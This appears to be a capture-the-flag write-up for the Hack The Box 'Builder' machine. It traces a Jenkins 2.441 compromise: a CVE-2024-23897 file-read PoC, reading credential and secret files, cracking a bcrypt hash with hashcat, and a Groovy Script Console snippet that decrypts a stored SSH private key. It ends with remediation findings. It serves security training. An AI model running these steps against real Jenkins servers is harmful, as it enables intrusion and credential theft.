01 / Case overview

Evidence standard

Passwords, bcrypt hashes, private-key contents, and flag values are redacted. The source notes contained target IPs from different HTB sessions, so this public version uses <TARGET_IP> consistently.

Builder demonstrates how an exposed CI/CD control plane can become a full-system compromise path. Jenkins provided the initial attack surface, vulnerable CLI behavior exposed controller files, application authentication material was recovered and cracked offline, and authenticated administrative access exposed credential material capable of privileged SSH authentication.

Key results

8080/tcp open  http    Jetty / Jenkins

Web enumeration

http://<TARGET_IP>:8080/

The Jenkins dashboard was reachable on TCP/8080 and reported Jenkins 2.441 in the interface.

Why this mattered: Jenkins became the primary application attack surface while SSH remained the likely post-compromise administration channel.

03 / Initial access

CVE-2024-23897 PoC

python3 CVE-2024-23897.py -u <TARGET_IP>:8080

Validate arbitrary file read

Read Jenkins user artifacts

/var/jenkins_home/users/users.xml
/var/jenkins_home/users/jennifer_*/config.xml

The user configuration exposed a bcrypt password hash associated with the Jenkins user jennifer.

Save the bcrypt hash

cat > jennifer.hash << 'EOF'
$2a$10$<REDACTED_BCRYPT_HASH>
EOF

Crack with Hashcat

hashcat -m 3200 -a 0 jennifer.hash /usr/share/wordlists/rockyou.txt --show

The recovered password was valid for Jenkins authentication. The actual hash and plaintext password are intentionally redacted.

Why this mattered: File-read access escalated into account compromise because readable Jenkins artifacts exposed offline-crackable authentication material.

05 / Privilege escalation

Relevant Jenkins credential artifacts

/var/jenkins_home/credentials.xml
/var/jenkins_home/secrets/master.key
/var/jenkins_home/secrets/hudson.util.Secret

Because the Script Console executed inside the controller context, Jenkins could decrypt its own stored credential material.

Decrypt the stored private key

import hudson.util.Secret

def xml = new File("/var/jenkins_home/credentials.xml").text

def m = (xml =~ /(?s)<privateKey>\{(.*?)\}<\/privateKey>/)
assert m.find() : "No <privateKey>{...}</privateKey> found"

def blob = m.group(1).trim()

def s = Secret.decrypt(blob)
if (s == null) {
    s = Secret.decrypt("{" + blob + "}")
}
assert s != null : "Secret.decrypt returned null"

println s.plainText

08 / Findings & remediation

F-01 — Vulnerable Jenkins release

Severity: High

The exposed Jenkins deployment was susceptible to arbitrary file-read behavior.

  • Upgrade Jenkins to a fixed release.
  • Restrict Jenkins CLI exposure.
  • Limit administrative access to trusted networks.

F-02 — Crackable application credential

Severity: High

A recovered bcrypt hash yielded a valid Jenkins credential through offline password cracking.

  • Require strong unique passwords.
  • Use MFA or centralized identity where supported.
  • Rotate exposed credentials.

F-03 — High-impact Jenkins administration

Severity: High

The compromised account could access functionality capable of operating-system command execution.

  • Restrict Script Console access.
  • Apply least-privilege authorization.
  • Audit administrative role membership regularly.

F-04 — Root-equivalent SSH credential in Jenkins

Severity: Critical

The Jenkins credential store contained a private key capable of privileged SSH authentication.

  • Avoid storing root-equivalent keys in CI/CD systems.
  • Use constrained service accounts.
  • Rotate the exposed key.
  • Prefer short-lived credentials.

10 / Lessons learned

  • CI/CD infrastructure is a high-value security boundary, not merely a development tool.
  • Arbitrary file read becomes substantially more severe when application secrets and password hashes are locally accessible.
  • Application authorization must be evaluated in terms of host-level blast radius.
  • Root-equivalent credentials should not be stored in broadly administered CI/CD platforms.
  • Commands, observed output, evidence, reasoning, and remediation should remain linked throughout a technical write-up.
